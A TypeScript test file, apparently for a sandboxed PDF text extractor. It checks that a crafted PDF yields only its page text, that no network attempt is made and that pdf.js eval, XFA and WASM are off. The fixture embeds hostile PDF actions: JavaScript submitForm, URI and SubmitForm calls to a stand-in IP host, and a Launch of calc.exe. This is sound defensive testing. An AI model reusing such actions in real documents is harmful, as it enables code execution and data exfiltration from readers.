import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { ExtractionProcessRunner } from './run-extraction-in-child-process.js';
import { pdfDocumentOptions } from './pdf-document-options.js';
import { buildPdf, latin1Bytes } from './test-support/build-pdf-fixture.js';

const LINE = 'Transmissor de pressao QT-310';
const auditRunner = new ExtractionProcessRunner({
  entryFile: fileURLToPath(new URL('./test-support/network-audit-child.ts', import.meta.url)),
});

/** PDF com conteúdo ativo de todos os tipos; nada disso pode ser executado ou lido. */
function activePdf(): Uint8Array {
  const external = 'http://198.51.100.7';
  const link = (action: string) =>
    `<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] /A ${action} >>`;
  return buildPdf({
    pages: [[LINE]],
    pageExtra: `/Annots [5 0 R 6 0 R 7 0 R 8 0 R] /AA << /O << /S /JavaScript /JS (app.alert('SEGREDO_JS')) >> >>`,
    catalogExtra:
      `/OpenAction << /S /JavaScript /JS (this.submitForm('${external}/js')) >> ` +
      `/Names << /EmbeddedFiles << /Names [(anexo.txt) 9 0 R] >> >> ` +
      `/AcroForm << /Fields [10 0 R] >> /URI << /Base (${external}/) >>`,
    extraObjects: [
      { dict: link(`<< /S /URI /URI (${external}/uri) >>`) },
      { dict: link(`<< /S /Launch /F (calc.exe) >>`) },
      { dict: link(`<< /S /GoToR /F (${external}/remoto.pdf) /D [0 /Fit] >>`) },
      { dict: link(`<< /S /SubmitForm /F << /FS /URL /F (${external}/submit) >> >>`) },
      {
        dict: `<< /Type /Filespec /F (anexo.txt) /EF << /F 11 0 R >> >>`,
      },
      { dict: `<< /FT /Tx /T (campo) /V (VALOR_CAMPO) /Rect [0 0 10 10] >>` },
      { dict: '<< /Type /EmbeddedFile >>', stream: latin1Bytes('ANEXO_SECRETO') },
    ],
  });
}

describe('PDF active content and network (real restricted child)', () => {
  it('reads only page text: no scripts, links, attachments or form values; zero network attempts', async () => {
    const result = await auditRunner.run({ format: 'PDF', bytes: activePdf() });
    const audit = JSON.parse(result.text) as {
      attempts: number;
      guardBlocks: Record<string, boolean>;
      reply: { ok: boolean; text: string };
    };
    expect(audit.attempts).toBe(0);
    expect(audit.guardBlocks).toEqual({
      fetch: true,
      net: true,
      http: true,
      https: true,
      tls: true,
      dns: true,
      dgram: true,
    });
    expect(audit.reply).toMatchObject({ ok: true, text: LINE });
    for (const secret of ['SEGREDO_JS', 'VALOR_CAMPO', 'ANEXO_SECRETO', 'calc.exe', '198.51']) {
      expect(audit.reply.text).not.toContain(secret);
    }
  }, 30_000);

  it('the document options are fixed: in-memory data only, no eval/XFA/fonts/WASM/URLs', () => {
    const options = pdfDocumentOptions(new Uint8Array([1]), '/pdfjs');
    expect(Object.keys(options).sort()).toEqual(
      [
        'cMapPacked',
        'cMapUrl',
        'data',
        'disableFontFace',
        'enableXfa',
        'isEvalSupported',
        'isImageDecoderSupported',
        'isOffscreenCanvasSupported',
        'stopAtErrors',
        'useSystemFonts',
        'useWasm',
        'verbosity',
      ].sort(),
    );
    expect(options).toMatchObject({
      isEvalSupported: false,
      enableXfa: false,
      disableFontFace: true,
      useSystemFonts: false,
      useWasm: false,
    });
    expect(options.cMapUrl.startsWith('/pdfjs')).toBe(true);
  });
});
